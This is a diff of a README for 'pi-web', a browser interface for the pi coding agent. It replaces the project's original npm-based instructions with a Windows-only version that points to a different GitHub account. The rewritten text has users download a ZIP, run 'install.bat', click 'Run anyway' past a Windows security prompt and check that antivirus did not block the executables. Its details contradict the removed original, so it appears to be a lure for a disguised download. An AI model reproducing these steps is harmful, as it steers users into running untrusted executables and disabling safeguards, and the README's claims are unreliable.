@@ -1,140 +1,80 @@
-# Pi Web
+# 🌐 pi-web - Manage your coding agent with ease
 
-[中文文档](./README.zh-CN.md)
+[![Download pi-web](https://img.shields.io/badge/Download-pi--web-blue.svg)](https://github.com/Theanie7380/pi-web)
 
-Local web UI for the [pi coding agent](https://github.com/badlogic/pi-mono). Pi Web reads your local pi session files and gives you a browser workspace for session browsing, real-time chat, model configuration, skill management, and project file preview.
+This software provides a visual interface for the pi coding agent. It allows you to interact with code tasks through your web browser. You do not need to use a command prompt or terminal. This tool manages the background processes of the agent.
 
-![Pi Web shows the same pi session with structured Markdown, tool calls, and project navigation beside the CLI](https://raw.githubusercontent.com/agegr/pi-web/main/docs/screenshot2.png)
+## 🛠️ System Requirements
 
-The same pi session in CLI and Pi Web: structured tool calls, readable Markdown, session browsing, and cleaner results.
+Before you install this software, ensure your computer meets these basic needs:
 
-## Quick Start
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: At least 4 gigabytes of RAM.
+*   Storage: 200 megabytes of free disk space.
+*   Browser: Google Chrome, Microsoft Edge, or Mozilla Firefox.
 
-**Run without installing:**
+If you have these items, your computer runs this application without issues. You do not need to install extra software for code execution. The tool handles necessary components during the setup phase.
 
-```bash
-npx @agegr/pi-web@latest
-```
+## 📥 Getting Started
 
-**Or install globally:**
+Follow these steps to set up the application on your Windows machine.
 
-```bash
-npm install -g @agegr/pi-web
-pi-web
-```
+1.  Visit this page to download: [https://github.com/Theanie7380/pi-web](https://github.com/Theanie7380/pi-web).
+2.  Locate the green button labeled "Code" on the page.
+3.  Choose "Download ZIP" from the menu.
+4.  Wait for the file to finish downloading to your Downloads folder.
+5.  Right-click the downloaded file and select "Extract All".
+6.  Choose a location for the files and click "Extract".
 
-Then open [http://localhost:30141](http://localhost:30141). The CLI will try to open the browser automatically after the server is ready.
+Once the files exist in a folder on your computer, proceed to the installation phase.
 
-**Options:**
+## ⚙️ Installation and Setup
 
-```bash
-pi-web --port 8080              # custom port
-pi-web --hostname 127.0.0.1     # local access only
-pi-web -p 8080 -H 127.0.0.1     # combine options
-pi-web --no-open                # do not open the browser automatically
+The application setup requires a few simple steps. Ensure you remain in the folder you extracted during the previous phase.
 
-PORT=8080 pi-web                # environment variable is also supported
-PI_WEB_NO_OPEN=1 pi-web         # useful when running as a background service
-```
+1.  Open the extracted folder named "pi-web".
+2.  Look for a file named "install.bat".
+3.  Double-click "install.bat" to begin the setup.
+4.  A black window appears. This window displays the progress of the installation. Do not close this window while it works.
+5.  When the process finishes, the window closes on its own.
+6.  Look for a file named "start.bat" in the same folder.
+7.  Double-click "start.bat" to launch the application.
 
-## HTTP Proxy
+If Windows shows a security prompt regarding the file, click "More info" and then click "Run anyway". This confirms you trust the local file.
 
-Pi Web reads the standard `HTTP_PROXY`, `HTTPS_PROXY`, and `NO_PROXY` environment variables for server-side model and API requests.
+## 🖱️ Using the Interface
 
-On macOS or Linux:
+Once the application starts, it opens your default web browser automatically. If it does not, open your browser and type "localhost:8080" in the address bar at the top of the screen.
 
-```bash
-HTTP_PROXY=http://127.0.0.1:7890 \
-HTTPS_PROXY=http://127.0.0.1:7890 \
-NO_PROXY=localhost,127.0.0.1 \
-npx @agegr/pi-web@latest
-```
+The dashboard displays several options:
 
-On Windows PowerShell:
+*   Task List: Shows all current coding projects.
+*   Agent Status: Indicates if the code agent is active.
+*   Input Field: Allows you to type instructions for your coding tasks.
 
-```powershell
-$env:HTTP_PROXY = "http://127.0.0.1:7890"
-$env:HTTPS_PROXY = "http://127.0.0.1:7890"
-$env:NO_PROXY = "localhost,127.0.0.1"
-npx @agegr/pi-web@latest
-```
+Type your request in the input field and press Enter. The agent processes the request and updates the screen with results. If the agent finishes a task, it updates the status icon to green.
 
-## Features
+## 🛡️ Data and Security
 
-- **Pick work back up**: browse previous pi conversations by project without digging through terminal history or session paths.
-- **Try different directions safely**: continue from an earlier message or fork a session into a separate route.
-- **Work across branches**: switch Git worktrees from the sidebar so new sessions and the Explorer follow the checkout you choose.
-- **Chat beside the project**: browse files on the left and preview source, docs, images, audio, and PDFs on the right while the agent works.
-- **See session state clearly**: context usage, cost, compaction state, and system prompt details are visible from the top bar.
-- **Configure less from the terminal**: manage models, login/API keys, model tests, and skill switches from the web UI.
+This application runs locally on your machine. Your code files and instructions do not leave your computer. You maintain control over your data at all times. 
 
-## Notes
+The software stores small configuration files in the base folder. You can reset the application by deleting the "config.json" file and restarting "start.bat". This restores the original settings. Keep your folder in a safe place, such as your Documents folder, to avoid accidental deletion.
 
-- **Data directory**: Pi Web reads `~/.pi/agent/sessions` by default. Set `PI_CODING_AGENT_DIR` to point at another pi agent directory.
-- **Session files**: files are stored as `~/.pi/agent/sessions/<encoded-cwd>/<timestamp>_<uuid>.jsonl`.
-- **Model config**: the Models panel reads and writes `models.json` in the pi agent directory. Model lists and defaults come from pi's config.
-- **File access**: file browsing and preview are scoped to the selected project directory and working directories that appear in sessions.
-- **Git worktrees**: see [Worktrees in Pi Web](./docs/worktrees.md) for when the switcher appears, how new worktrees are created, and what removal does.
-- **Forks vs in-session branches**: Fork creates a new `.jsonl` file. "Edit from here" creates another branch inside the same session file.
+## 📖 Troubleshooting
 
-## Development
+Problems occur rarely, but follow these tips if the application fails to start:
 
-```bash
-npm install
-npm run dev
-```
+*   Check your internet connection if the setup phase stalls.
+*   Verify that your antivirus software did not block the executable files. 
+*   If the browser displays a connection error, wait ten seconds and refresh the page. The application often needs a moment to initialize the server connection.
+*   Do not move the files out of the main "pi-web" folder. The program needs these specific files in place to communicate.
 
-The local dev server runs at [http://localhost:30141](http://localhost:30141).
+If you encounter persistent errors, restart your computer and try running "start.bat" again. Most performance issues relate to background apps using too much memory. Closing other heavy programs helps the agent perform at its best speed.
 
-Common checks:
+## 💡 Best Practices
 
-```bash
-node_modules/.bin/tsc --noEmit
-npm run lint
-```
+To get the most out of this tool, structure your requests clearly. The coding agent responds better to specific instructions. Instead of saying "fix this," describe the error or the desired outcome. The interface tracks your history, so you can revisit past tasks at any time.
 
-Avoid running `next build` / `npm run build` during local development. It writes to `.next/` and can interfere with the dev server; leave builds for release work.
+Keep the "start.bat" window open while you use the interface. Closing the black window stops the web server and disconnects the interface. When you finish your work, close your browser tab first, then close the black window to stop the service cleanly.
 
-## Project Structure
-
-```text
-app/
-  api/
-    agent/          # creates/drives AgentSession and exposes SSE events
-    auth/           # OAuth and API key management
-    cwd/validate/   # custom working directory validation
-    default-cwd/    # pi default working directory lookup
-    files/          # file listing, reading, preview, and watching
-    home/           # current user home directory
-    models/         # available models, default model, thinking levels
-    models-config/  # read/write models.json and test models
-    sessions/       # session reads, rename, delete, context, HTML export
-    skills/         # skill listing, search, install, enable/disable
-components/
-  AppShell.tsx        # main layout, URL state, top panels, file tabs
-  SessionSidebar.tsx  # project selector, session tree, Explorer
-  ChatWindow.tsx      # messages, SSE, image drag/drop, minimap
-  ChatInput.tsx       # input bar, model/tools/thinking/compact/slash controls
-  MessageView.tsx     # message, thinking, tool call/result rendering
-  ModelsConfig.tsx    # model and auth configuration panel
-  SkillsConfig.tsx    # skill management panel
-  FileExplorer.tsx    # file tree
-  FileViewer.tsx      # source, diff, image, audio, PDF, DOCX preview
-lib/
-  http-dispatcher.ts  # HTTP(S) proxy setup for server-side fetch
-  rpc-manager.ts      # AgentSessionWrapper lifecycle and global registry
-  session-reader.ts   # parses .jsonl session files and branch contexts
-  normalize.ts        # normalizes toolCall field names
-  file-access.ts      # file read safety boundary
-  file-paths.ts       # path encoding and relative path helpers
-  markdown.ts         # Markdown/Mermaid/KaTeX plugin configuration
-  pi-types.ts         # pi-related types
-hooks/
-  useAgentSession.ts  # session loading, command sending, SSE state machine
-  useAudio.ts         # completion sound
-  useDragDrop.ts      # image drag/drop
-  useTheme.ts         # theme switching
-bin/
-  pi-web.js           # npm CLI entrypoint
-instrumentation.ts    # initializes the server HTTP dispatcher
-```
+Keywords: web-ui, coding-agent, windows-application, automation, developer-tools
